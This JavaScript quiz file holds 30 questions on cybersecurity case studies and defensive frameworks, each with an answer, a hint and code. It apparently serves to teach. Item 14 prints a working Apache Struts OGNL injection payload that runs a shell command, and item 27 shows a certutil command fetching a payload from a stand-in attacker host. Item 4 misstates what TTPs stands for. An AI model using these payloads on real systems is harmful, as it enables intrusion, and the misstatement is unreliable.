// topic0_questions.js
// 30 Comprehensive Questions on The Value of Case Study Analysis in Cyber Security

const questions = [
  {
    id: 1,
    question: "Why is forensic case study analysis considered indispensable in modern enterprise cyber defense?",
    shortAnswer: "It transforms theoretical security concepts into empirical blueprints by analyzing real-world attack vectors, adversary playbooks, and systemic defense failures.",
    explanation: "Post-incident case studies bridge the gap between academic theory and active adversarial reality. By examining empirical attack paths, root causes (e.g., misconfigurations, unpatched zero-days, human error), blast radiuses, and remediation timelines, organizations can calibrate threat models and preemptively patch similar systemic vulnerabilities.",
    hint: "Think about learning from historical disasters to prevent future enterprise breaches.",
    level: "Moderate",
    codeExample: `// Empirical Threat Modeling mapping derived from historical incident post-mortems:
const threatVectorMapping = {
  vector: "Third-Party HVAC Vendor Portal",
  vulnerability: "No Multi-Factor Authentication (MFA) + Flat Network",
  historicalPrecedent: "Target Breach (2013)",
  recommendedControl: "Enforce ZTNA + 802.1Q Micro-segmentation"
};`
  },
  {
    id: 2,
    question: "What is the primary role of a 'Root Cause Analysis' (RCA) in a post-breach case study?",
    shortAnswer: "To drill past immediate symptoms (e.g., malware execution) down to foundational security deficiencies such as governance, architecture, or policy failures.",
    explanation: "Root Cause Analysis (often utilizing methods like the '5 Whys' or Fishbone/Ishikawa diagrams) ensures that security teams do not merely remediate the symptom (such as deleting an infected binary), but identify the governance flaw, architectural lack of segmentation, or patch delay that permitted initial access.",
    hint: "Distinguish between the superficial trigger and the core systemic failure.",
    level: "Moderate",
    codeExample: `/* 5 Whys RCA Example:
 1. Why was the database dumped? -> Attacker executed SQLi.
 2. Why did SQLi succeed? -> Input parameter was concatenated directly.
 3. Why was it concatenated? -> Legacy custom query was not migrated to ORM.
 4. Why was it missed in review? -> CI/CD SAST pipeline was bypassed for urgent release.
 5. Root Cause: Lack of enforced automated security gates in deployment pipeline. */`
  },
  {
    id: 3,
    question: "In cyber security case study methodology, what is meant by the 'Blast Radius'?",
    shortAnswer: "The total extent and scope of systems, data, operations, and financial assets compromised or impacted during a security incident.",
    explanation: "Blast radius measures lateral propagation and operational damage. A well-segmented network limits the blast radius to a single compromised host, whereas a flat enterprise network allows a localized malware infection to spread across the entire infrastructure (as seen in NotPetya and Colonial Pipeline).",
    hint: "Consider how far an explosion spreads within a physical or logical perimeter.",
    level: "Moderate",
    codeExample: `// Calculating Blast Radius Metric:
const blastRadius = {
  initialCompromise: "Ichapur Workstation (VLAN 10)",
  containedPerimeter: true,
  impactedHosts: 1,
  totalEnterpriseHosts: 2500,
  containmentEfficiency: ((2500 - 1) / 2500) * 100 // 99.96%
};`
  },
  {
    id: 4,
    question: "How does the MITRE ATT&CK framework enhance the documentation of historical cyber attack case studies?",
    shortAnswer: "By providing a standardized matrix of adversary Tactics, Techniques, and Common Knowledge (TTPs) across the entire attack lifecycle.",
    explanation: "MITRE ATT&CK provides a common taxonomy for researchers and SOC analysts to map exact adversary behaviors (e.g., T1059 Command and Scripting Interpreter, T1078 Valid Accounts). This standardization allows defensive teams to compare diverse case studies and identify overlapping adversary playbooks.",
    hint: "Standardized taxonomy for mapping tactics, techniques, and procedures.",
    level: "Moderate",
    codeExample: `// MITRE ATT&CK JSON mapping for a breach study:
{
  "tactic": "Initial Access",
  "technique_id": "T1566.001",
  "technique_name": "Spearphishing Attachment",
  "detection_rule": "SIGMA: Suspicious Macro Execution from Outlook Temp"
}`
  },
  {
    id: 5,
    question: "What is the difference between 'Dwell Time' and 'Mean Time to Detect' (MTTD) in incident case studies?",
    shortAnswer: "Dwell time is the total duration from initial adversary compromise until complete eviction, while MTTD measures the time elapsed from breach occurrence to initial detection.",
    explanation: "Historical case studies (e.g., Equifax: 76 days, SolarWinds: ~9 months) highlight dwell time as a critical metric. A prolonged dwell time allows adversaries to perform thorough internal reconnaissance, credential dumping, persistence installation, and unhurried data exfiltration.",
    hint: "Detecting is the first step; dwelling covers the adversary's total presence.",
    level: "Expert",
    codeExample: `// Dwell Time vs MTTD calculation:
const initialInfection = new Date("2026-01-10T04:15:00Z");
const alertGenerated    = new Date("2026-03-27T11:30:00Z"); // MTTD = 76 days
const remediationDone   = new Date("2026-04-02T18:00:00Z"); // Dwell Time = 82.5 days`
  },
  {
    id: 6,
    question: "Why are landmark case studies critical for justifying corporate Cyber Security ROI (Return on Investment)?",
    shortAnswer: "They quantify the catastrophic direct and indirect financial penalties of negligence (fines, ransomware payouts, downtime, stock dips) versus proactive defense costs.",
    explanation: "Executive boards often treat security as an overhead expense until presented with empirical case study data. For example, contrasting the cost of a ₹5,00,000 MFA rollout with a ₹45 Crore ransomware extortion and business interruption loss clearly validates proactive security budgets.",
    hint: "Think about presenting real-world loss data to CFOs and Board members.",
    level: "Moderate",
    codeExample: `// ROI of Proactive Security Implementation:
const proactiveMfaCostINR = 500000; // ₹5 Lakhs
const breachCostAvoidanceINR = 450000000; // ₹45 Crores
const riskReductionRoi = ((breachCostAvoidanceINR - proactiveMfaCostINR) / proactiveMfaCostINR) * 100; // 89,900% ROI`
  },
  {
    id: 7,
    question: "What is the Cyber Kill Chain model developed by Lockheed Martin, and how is it used in case studies?",
    shortAnswer: "A 7-phase model (Recon, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives) used to pinpoint where an attack could have been disrupted.",
    explanation: "By decomposing an attack into sequential phases, analysts evaluate defensive efficacy at each stage. Disrupting the adversary at any single link prior to 'Actions on Objectives' prevents mission success for the attacker.",
    hint: "Seven sequential links where breaking one prevents full breach completion.",
    level: "Moderate",
    codeExample: `const cyberKillChain = [
  "1. Reconnaissance",
  "2. Weaponization",
  "3. Delivery",
  "4. Exploitation",
  "5. Installation",
  "6. Command & Control (C2)",
  "7. Actions on Objectives"
];`
  },
  {
    id: 8,
    question: "What is a 'Post-Mortem' or 'After-Action Review' (AAR) document in cyber security incident response?",
    shortAnswer: "A formal retrospective report detailing what happened, what went well, what failed, and the concrete corrective actions required to prevent recurrence.",
    explanation: "An AAR is authored after incident containment and eradication. It provides an objective timeline, analyzes tool effectiveness, evaluates communication protocols, and assigns accountability for remedial tasks (e.g., patch deployment, architecture redesign).",
    hint: "The formal retrospective report produced after incident closure.",
    level: "Moderate",
    codeExample: `// Standard Sections of an AAR / Incident Post-Mortem:
const postMortemStructure = {
  executiveSummary: "High-level summary for C-suite and legal counsel",
  chronologicalTimeline: "Timestamped log of events from T0 to resolution",
  rootCauseAnalysis: "Underlying vulnerabilities and process failures",
  impactAssessment: "Data loss, financial impact, operational downtime",
  correctiveActions: "Action items with owners, deadlines, and tracking tickets"
};`
  },
  {
    id: 9,
    question: "How do supply chain breaches (like Target 2013 and SolarWinds 2020) emphasize the need for Zero Trust Architecture?",
    shortAnswer: "They demonstrate that third-party vendors and trusted software updates cannot be inherently trusted with perimeter-wide network access.",
    explanation: "Legacy perimeter security ('castle-and-moat') assumes internal network traffic is trustworthy. Target was breached via a third-party HVAC vendor's credentials, and SolarWinds via signed software updates. Zero Trust ('Never Trust, Always Verify') enforces micro-segmentation and continuous authentication regardless of source.",
    hint: "Castle-and-moat perimeter models fail when a trusted partner or binary is subverted.",
    level: "Expert",
    codeExample: `// Zero Trust continuous validation pseudo-rule:
function evaluateAccessRequest(subject, resource, context) {
  if (!subject.hasMfaValid() || !subject.deviceComplianceChecked()) {
    return "DENY_ACCESS";
  }
  if (!subject.roleHasLeastPrivilegeFor(resource)) {
    return "DENY_ACCESS";
  }
  return "ALLOW_JUST_IN_TIME_SESSION";
}`
  },
  {
    id: 10,
    question: "What role does 'Chain of Custody' play during digital forensic investigations of cyber attack case studies?",
    shortAnswer: "It provides a verifiable, chronological paper trail proving who collected, handled, analyzed, and stored digital evidence to maintain court admissibility.",
    explanation: "Without a rigorous Chain of Custody, digital artifacts (disk images, memory dumps, PCAP files) can be challenged in legal proceedings as tampered or compromised. Proper documentation, cryptographic hashing (SHA-256), and secure storage ensure evidence integrity.",
    hint: "Ensuring digital evidence remains untampered and legally admissible.",
    level: "Expert",
    codeExample: `// Evidence Hash Verification Log:
const forensicEvidence = {
  evidenceId: "EVID-KOLKATA-2026-088",
  item: "Forensic RAM Dump (Mamata-Server-01)",
  collectedBy: "Sukanta Hui (Lead Forensic Auditor)",
  collectionTime: "2026-08-23T06:30:00Z",
  sha256Hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
  storageLocation: "Kolkata SOC Tamper-Proof Evidence Safe #3"
};`
  },
  {
    id: 11,
    question: "Why did the Sony Pictures 2014 case study fundamentally alter enterprise perceptions of nation-state cyber warfare?",
    shortAnswer: "It demonstrated that state-sponsored actors would deploy destructive wiping malware (Wiper) and conduct public extortion against non-military commercial entities.",
    explanation: "Prior to Sony Pictures, commercial enterprises viewed nation-state Advanced Persistent Threats (APTs) primarily as espionage agents. Sony proved that geopolitical conflicts could lead to destructive wiper malware, proprietary IP leaks, executive email dumps, and physical threat intimidation.",
    hint: "Destructive wipers and public extortion targeted at a commercial entertainment studio.",
    level: "Moderate",
    codeExample: `// Wiper malware characteristic behavior:
function simulateWiperPayload() {
  // Overwriting Master Boot Record (MBR) and Raw Disk Sectors
  const targetSector = "\\\\.\\PhysicalDrive0";
  // Writes zeros or garbage strings across raw storage geometry
  return "CRITICAL_SYSTEM_UNBOOTABLE";
}`
  },
  {
    id: 12,
    question: "In the 2015 Ukraine Power Grid attack case study, what combination of techniques achieved physical blackout?",
    shortAnswer: "Spear-phishing (BlackEnergy 3 malware), credential theft, SCADA/ICS operator station hijacking, firmware wiping of serial-to-Ethernet converters, and telephony DoS.",
    explanation: "The attackers orchestrated a multi-vector synchronized assault: they remotely took control of Human-Machine Interfaces (HMIs) to open circuit breakers, rewrote converter firmware to prevent remote reconnection, wiped operator workstations with KillDisk, and flooded customer call centers with fake calls to delay incident reporting.",
    hint: "A hybrid multi-stage assault combining IT intrusion, OT takeover, and telephony DoS.",
    level: "Expert",
    codeExample: `/* Ukraine Grid 2015 Attack Matrix:
 1. IT Infiltration: Spearphishing macro (.doc) drops BlackEnergy 3
 2. Lateral Movement: VPN access to OT/SCADA network with stolen domain credentials
 3. OT Execution: Unauthorized command injection to open substation breakers
 4. Anti-Forensics: KillDisk wipes workstations; corrupted firmware on RTU bridges
 5. Telephony Denial: TDoS flooded call center to blind dispatchers */`
  },
  {
    id: 13,
    question: "What technical flaw in the Server Message Block (SMBv1) protocol enabled the rapid global outbreak of WannaCry in 2017?",
    shortAnswer: "A buffer overflow vulnerability (MS17-010 / EternalBlue) allowing unauthenticated Remote Code Execution (RCE) via specially crafted SMB packets.",
    explanation: "WannaCry paired a ransomware payload with a worm-like propagation engine using the leaked NSA exploit 'EternalBlue' (CVE-2017-0144). It scanned TCP port 445 globally and across internal LANs, automatically infecting and encrypting unpatched Windows systems without user interaction.",
    hint: "Port 445 SMBv1 vulnerability weaponized with an automated worm propagation engine.",
    level: "Moderate",
    codeExample: `// Snort Rule Signature for EternalBlue SMB exploit:
alert tcp any any -> any 445 (
  msg:"OS-WINDOWS Microsoft Windows SMBv1 EternalBlue exploit attempt";
  flow:to_server,established;
  content:"|FF|SMB|72|"; offset:4; depth:5;
  byte_test:1,&,0x01,29;
  sid:42329; rev:1;
)`
  },
  {
    id: 14,
    question: "What governance failure was identified as the primary root cause in the 2017 Equifax breach case study?",
    shortAnswer: "Failure to patch a known, critical vulnerability (Apache Struts CVE-2017-5638) for over two months after a public patch and US-CERT alert were issued.",
    explanation: "Equifax's security team failed to maintain an accurate software asset inventory, resulting in their online dispute portal remaining unpatched. Attackers leveraged the Jakarta Multipart parser bug to gain a shell, discover unencrypted database credentials in plain text, and exfiltrate records of 147 million consumers.",
    hint: "Asset inventory blind spot and a 2-month delay in patching a known critical vulnerability.",
    level: "Moderate",
    codeExample: `// HTTP header exploit vector for CVE-2017-5638 (Apache Struts):
// Content-Type header containing OGNL injection payload:
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).` +
`(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).` +
`(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).` +
`(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).` +
`(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').` +
`toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).` +
`(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).` +
`(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).` +
`(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}`
  },
  {
    id: 15,
    question: "How did the 2020 SolarWinds supply chain attack conceal its Command & Control (C2) communication?",
    shortAnswer: "SUNBURST backdoor embedded in Orion updates masqueraded C2 traffic as legitimate Orion Improvement Program (OIP) telemetry and communicated via randomized subdomain DNS queries.",
    explanation: "Attackers injected malicious code into `SolarWinds.Orion.Core.BusinessLayer.dll` inside the vendor's build pipeline. When deployed by 18,000 customers, SUNBURST stayed dormant for two weeks, checked for security analysis tools, and then beaconed via CNAME DNS lookups to domain generation algorithm (DGA) subdomains on `avsvmcloud[.]com`.",
    hint: "Build pipeline compromise and DNS tunneling masquerading as legitimate software telemetry.",
    level: "Expert",
    codeExample: `// SUNBURST DGA Domain Resolution Simulation:
function generateSunburstC2Domain(encodedVictimGuid) {
  const c2BaseDomain = "avsvmcloud.com";
  // Uses custom base32-like algorithm to encode internal Active Directory domain
  return \`\${encodedVictimGuid}.\${c2BaseDomain}\`;
}`
  },
  {
    id: 16,
    question: "In the 2021 Colonial Pipeline incident, why was the operational pipeline shut down even though only IT systems were encrypted?",
    shortAnswer: "The company could not bill customers without the billing and metering IT systems, and shut down OT proactively out of fear the ransomware might jump to operational pipelines.",
    explanation: "Colonial Pipeline's billing and financial tracking systems were compromised via DarkSide ransomware (accessed via a single compromised VPN credential without MFA). Because IT and OT operational data were intertwined and billing could not proceed, management halted fuel transport for 6 days, causing panic buying on the US East Coast.",
    hint: "Billing IT system failure and fear of ransomware crossing the IT/OT boundary.",
    level: "Moderate",
    codeExample: `// Colonial Pipeline Risk Boundary:
const enterpriseLayers = {
  IT_Layer: "Compromised (Billing, Invoicing, Active Directory)",
  OT_Layer: "Uninfected but proactively shut down due to lack of verified network isolation",
  rootAccessVector: "Legacy inactive VPN account lacking Multi-Factor Authentication"
};`
  },
  {
    id: 17,
    question: "What is 'Defense-in-Depth', and how do historical breach post-mortems validate this strategy?",
    shortAnswer: "The deployment of layered security controls (preventive, detective, responsive) so that the failure of any single control does not result in a catastrophic breach.",
    explanation: "Every major case study demonstrates that a single security control (such as a firewall, an antivirus agent, or a strong password) will eventually fail or be bypassed. Defense-in-depth ensures that perimeter firewalls, MFA, micro-segmentation, EDR, SIEM logging, and immutable backups work in concert.",
    hint: "Multiple layers of defense ensuring no single point of failure.",
    level: "Moderate",
    codeExample: `// Defense-in-Depth Layer Stack:
const defenseLayers = [
  "Layer 1: Perimeter (Next-Gen Firewall / WAF / Cloudflare DDoS)",
  "Layer 2: Identity (FIDO2 Hardware MFA + Least Privilege RBAC)",
  "Layer 3: Network (Zero Trust Micro-segmentation / VLANs)",
  "Layer 4: Endpoint (EDR Agent with behavioral heuristic blocking)",
  "Layer 5: Data (AES-256 GCM encryption at rest + Key Vault)",
  "Layer 6: Recovery (Air-gapped, immutable write-once backups)"
];`
  },
  {
    id: 18,
    question: "How does a 'Red Team vs Blue Team' tabletop exercise utilize real-world cyber attack case studies?",
    shortAnswer: "It simulates historic attack playbooks and adversary TTPs against current organizational defenses to evaluate preparedness, communication, and response speed without operational disruption.",
    explanation: "Tabletop simulations take known case study scripts (e.g., 'A rogue HVAC vendor account logs into the Barrackpore datacenter at 2 AM') and test how the Blue Team (SOC analysts, incident handlers, executive leadership) detects, escalates, and contains the synthetic breach.",
    hint: "Simulating historic incident scenarios to stress-test real response teams.",
    level: "Moderate",
    codeExample: `// Tabletop Exercise Scenario Generator:
const exerciseScenario = {
  name: "Operation Barrackpore Shield",
  inspiredBy: "Target 2013 + Colonial Pipeline 2021",
  inject_1: "09:00 AM - Alert: High-volume outbound data from Jadavpur branch server",
  inject_2: "10:15 AM - Ransom note posted on internal ticketing portal by 'DarkBengal'",
  actionRequired: "Isolate VLAN 40, verify immutable backup snapshots, notify CERT-In"
};`
  },
  {
    id: 19,
    question: "What is an 'Indicators of Compromise' (IOC) feed, and how is it compiled from post-incident investigations?",
    shortAnswer: "A curated list of forensic artifacts (malicious IP addresses, domain names, file hashes, registry keys) observed during an active attack investigation.",
    explanation: "When forensic investigators analyze a breach, they extract specific digital fingerprints left by the attackers. These IOCs are formatted into STIX/TAXII or MISP feeds and shared globally so other organizations can block or hunt for those exact threat indicators.",
    hint: "Forensic fingerprints (hashes, IPs, domains) shared to protect the wider ecosystem.",
    level: "Moderate",
    codeExample: `// Sample STIX/JSON formatted IOC:
{
  "type": "indicator",
  "name": "BlackEnergy C2 Server IP",
  "pattern": "[ipv4-addr:value = '194.58.112.174']",
  "valid_from": "2026-08-23T00:00:00Z",
  "confidence": 95
}`
  },
  {
    id: 20,
    question: "In case study analysis, what is the significance of the 'Diamond Model of Intrusion Analysis'?",
    shortAnswer: "A framework that models an intrusion event across four core vertices: Adversary, Capability, Infrastructure, and Victim.",
    explanation: "The Diamond Model maps how an Adversary uses specific Capabilities (tools/exploits) over physical/logical Infrastructure to target a Victim. It allows analysts to track evolving adversary campaigns across multiple incidents over time.",
    hint: "Four vertices: Adversary, Capability, Infrastructure, Victim.",
    level: "Expert",
    codeExample: `// Diamond Model Data Structure:
const intrusionEvent = {
  adversary: "APT29 (Cozy Bear)",
  capability: "SUNBURST Backdoor DLL Injection",
  infrastructure: "avsvmcloud[.]com DGA DNS C2 servers",
  victim: "Government agencies and Fortune 500 enterprises"
};`
  },
  {
    id: 21,
    question: "What critical lesson does the 2010 Stuxnet incident teach regarding 'Air-Gapped' networks?",
    shortAnswer: "Air-gapping alone does not guarantee security against determined adversaries capable of leveraging removable media (USB drives) and zero-day vulnerabilities.",
    explanation: "The Natanz nuclear enrichment facility was completely physically isolated (air-gapped) from the Internet. Stuxnet bypassed this physical barrier by using weaponized USB thumb drives, utilizing four zero-day vulnerabilities (including LNK shortcut execution CVE-2010-2568) to automatically cross the air-gap.",
    hint: "Physical isolation can be breached via infected USB drives and weaponized zero-days.",
    level: "Moderate",
    codeExample: `// Air-Gap Crossing Simulation:
const usbInfectionVector = {
  media: "SanDisk USB Thumb Drive",
  exploit: "CVE-2010-2568 (Windows Shell LNK Vulnerability)",
  action: "Auto-executes payload when folder containing malicious shortcut is opened in Windows Explorer",
  propagation: "Infects WinCC SCADA software on adjacent Siemens STEP 7 PLCs"
};`
  },
  {
    id: 22,
    question: "How does the principle of 'Least Privilege' (PoLP) prevent lateral movement in multi-tier enterprise systems?",
    shortAnswer: "By restricting user accounts, services, and applications strictly to the minimal access rights necessary to perform their legitimate job functions.",
    explanation: "In many landmark breaches (e.g., Target 2013), an external contractor account had network access to payment processing zones. If Least Privilege is strictly enforced, an HVAC vendor portal account cannot route packets to Point of Sale (POS) domain controllers.",
    hint: "Only granting the absolute bare minimum access permissions needed for a role.",
    level: "Moderate",
    codeExample: `// IAM Policy enforcing Principle of Least Privilege:
const hvacVendorPolicy = {
  principal: "user:hvac_contractor_ichapur",
  allowActions: ["read:temperature_telemetry", "write:hvac_setpoints"],
  denyActions: ["*"],
  allowedNetworks: ["192.168.50.0/24"], // Restricted Facilities VLAN
  prohibitedNetworks: ["10.0.0.0/8", "192.168.100.0/24"] // Deny access to POS/Database VLANs
};`
  },
  {
    id: 23,
    question: "What is 'Shadow IT', and how has it contributed to high-profile enterprise security breaches?",
    shortAnswer: "Hardware, software, or cloud services deployed within an enterprise without explicit approval, visibility, or security oversight from the central IT/Security department.",
    explanation: "Shadow IT creates unmonitored attack surfaces. An unpatched legacy test server deployed by a developer, an unapproved AWS S3 bucket storing customer PII, or an unmanaged rogue access point in a branch office can provide attackers with unmonitored entry points into the corporate network.",
    hint: "Unapproved, unmonitored IT assets deployed without security team knowledge.",
    level: "Moderate",
    codeExample: `// Asset Discovery alerting on Shadow IT:
function detectShadowAssets(subnetScanResults, approvedAssetRegistry) {
  return subnetScanResults.filter(device => !approvedAssetRegistry.includes(device.macAddress));
  // Returns rogue servers, unmanaged routers, and unauthorized dev instances
}`
  },
  {
    id: 24,
    question: "Why is 'Micro-segmentation' superior to traditional VLAN-based network segmentation in stopping malware lateral spread?",
    shortAnswer: "Micro-segmentation enforces granular security policies down to individual workloads and hosts, blocking East-West traffic even within the same subnet.",
    explanation: "Traditional VLAN segmentation controls North-South traffic passing through a default gateway, but leaves East-West traffic between hosts on the same subnet uninspected. Micro-segmentation applies host-level software firewalls and zero-trust identity policies to isolate every node.",
    hint: "Granular workload-level policy enforcement preventing lateral East-West traversal.",
    level: "Expert",
    codeExample: `// Micro-segmentation rule (Host Firewall / Calico / Illumio):
// Even if Host A and Host B are on 192.168.1.0/24:
// Host A (Web Server) can ONLY talk to Host B (App Server) on TCP Port 8080:
iptables -A FORWARD -s 192.168.1.10 -d 192.168.1.20 -p tcp --dport 8080 -j ACCEPT
iptables -A FORWARD -s 192.168.1.10 -d 192.168.1.0/24 -j DROP`
  },
  {
    id: 25,
    question: "How does the Indian Digital Personal Data Protection Act (DPDP Act 2023) penalize organizations that fail to implement reasonable security safeguards resulting in breaches?",
    shortAnswer: "It empowers the Data Protection Board of India to levy statutory financial penalties up to ₹250 Crores per significant data breach event.",
    explanation: "Under the DPDP Act 2023, data fiduciaries in India (including businesses in Kolkata, Barrackpore, and across India) are legally mandated to implement robust technical and organizational security safeguards. Failure to prevent data breaches or delay in notifying the Data Protection Board can incur penalties up to ₹250 Crores.",
    hint: "Statutory fines up to ₹250 Crores under the Indian DPDP Act 2023 for data breaches.",
    level: "Moderate",
    codeExample: `// Compliance Risk Assessment under DPDP Act 2023:
const regulatoryBreachExposure = {
  jurisdiction: "Republic of India",
  statute: "Digital Personal Data Protection (DPDP) Act, 2023",
  maximumStatutoryPenaltyINR: 2500000000, // ₹250 Crores
  mandatoryObligations: [
    "Implement Reasonable Security Safeguards (Encryption, MFA)",
    "Prompt Breach Notification to Data Protection Board and Data Principals",
    "Periodic Data Protection Impact Assessments (DPIA)"
  ]
};`
  },
  {
    id: 26,
    question: "What is 'Threat Hunting', and how does it leverage case study intelligence to detect stealthy adversaries?",
    shortAnswer: "A proactive, hypothesis-driven methodology where security analysts actively search through networks and endpoints for threats that have evaded automated security tools.",
    explanation: "Unlike passive alert monitoring, threat hunters assume the organization is already breached. They use hypotheses derived from case studies (e.g., 'An adversary is using living-off-the-land PowerShell scripts to dump LSASS memory') and search telemetry for anomalous behaviors.",
    hint: "Proactive hypothesis-driven search assuming the adversary is already inside.",
    level: "Expert",
    codeExample: `// Threat Hunting Hypothesis Query (Kusto / Splunk):
// Search for unusual LSASS memory access from non-system binaries:
ProcessCreation
| where ProcessName == "rundll32.exe" and CommandLine has "comsvcs.dll" and CommandLine has "MiniDump"
| project Timestamp, ComputerName, AccountName, CommandLine`
  },
  {
    id: 27,
    question: "What is 'Living-off-the-Land' (LotL) / Living-off-the-Land Binaries (LOLBins), and why do case studies frequently highlight them?",
    shortAnswer: "The use of legitimate, pre-installed operating system utilities (e.g., PowerShell, WMI, Certutil, MSBuild) to execute malicious actions without dropping custom malware binaries.",
    explanation: "Because LOLBins are signed by Microsoft or trusted OS vendors, traditional signature-based antivirus scanners often ignore their execution. Attackers utilize tools like `certutil.exe -urlcache -split -f` to download payloads or `powershell.exe -enc` to execute in-memory scripts.",
    hint: "Using built-in system tools like PowerShell or Certutil to evade antivirus detection.",
    level: "Expert",
    codeExample: `// Example of LOLBin misuse:
// Certutil abused to download remote payload:
// certutil.exe -urlcache -split -f "https://evil.c2/payload.exe" C:\\Windows\\Temp\\update.exe

// Defensive Detection Rule (Sigma):
// EventID: 4688 (Process Creation)
// Image: *\\certutil.exe
// CommandLine: *-urlcache* OR *-split*`
  },
  {
    id: 28,
    question: "Why is 'Immutable Backup Storage' a mandatory countermeasure against modern ransomware playbooks?",
    shortAnswer: "It prevents attackers or ransomware payloads from modifying, encrypting, or deleting backup snapshots even if they gain full domain administrator privileges.",
    explanation: "Modern ransomware strains (e.g., LockBit, BlackCat, DarkSide) deliberately seek out and destroy online backups, VSS shadow copies, and cloud backup vaults before triggering encryption. Write-Once-Read-Many (WORM) immutable backups ensure recovery without paying ransoms.",
    hint: "Write-Once-Read-Many (WORM) storage that cannot be deleted or modified even by admins.",
    level: "Moderate",
    codeExample: `// AWS S3 Object Lock configuration for Immutable Backup:
const bucketLockConfig = {
  ObjectLockConfiguration: {
    ObjectLockEnabled: "Enabled",
    Rule: {
      DefaultRetention: {
        Mode: "COMPLIANCE", // Cannot be overwritten or shortened by ANY IAM user or root account
        Days: 365
      }
    }
  }
};`
  },
  {
    id: 29,
    question: "What is the primary role of CERT-In (Indian Computer Emergency Response Team) in enterprise incident response?",
    shortAnswer: "The national nodal agency for responding to computer security incidents in India, responsible for cybersecurity directives, vulnerability alerts, and mandatory incident reporting.",
    explanation: "Under Indian cybersecurity guidelines, entities must report specified cyber security incidents (including ransomware, data breaches, supply chain attacks, and identity theft) to CERT-In within 6 hours of noticing such incidents, enabling coordinated national threat containment.",
    hint: "India's national nodal cybersecurity agency with mandatory 6-hour breach reporting guidelines.",
    level: "Moderate",
    codeExample: `// Mandatory Incident Reporting fields for CERT-In:
const certInIncidentReport = {
  reportingEntity: "Barrackpore Financial Tech Hub Pvt Ltd",
  incidentType: "Ransomware Attack & System Disruption",
  timeOfDetection: "2026-08-23T08:15:00+05:30",
  affectedSystems: ["Hyper-V Cluster Nodes 1-4", "Customer Billing DB"],
  containmentStatus: "Network interfaces physically disconnected",
  designatedContactOfficer: "Susmita (Chief Information Security Officer)"
};`
  },
  {
    id: 30,
    question: "How does conducting continuous security audits and vulnerability assessments turn case study lessons into permanent organizational resilience?",
    shortAnswer: "By systematically validating that defensive controls, patch schedules, access boundaries, and backup integrity are actively operational before adversaries can exploit gaps.",
    explanation: "Case studies teach what failed elsewhere. Periodic penetration testing, vulnerability scanning (Nessus/OpenVAS), credential audits, red team simulations, and external compliance reviews convert those lessons into verified technical posture, ensuring the enterprise never repeats historical mistakes.",
    hint: "Continuous validation that lessons learned are actively enforced across all assets.",
    level: "Moderate",
    codeExample: `// Continuous Vulnerability Assessment & Remediation Loop:
const continuousSecurityWorkflow = [
  "1. Identify Assets (Automated IP & Software Discovery)",
  "2. Scan & Map (Vulnerability Scanners against CVE databases)",
  "3. Prioritize (CVSS v3.1 Score + Exploit Prediction Scoring System - EPSS)",
  "4. Remediate / Patch (SLA: Critical < 48hrs, High < 7 days)",
  "5. Re-scan & Validate (Verify exploit elimination)",
  "6. Report & Update Risk Register"
];`
  }
];

export default questions;
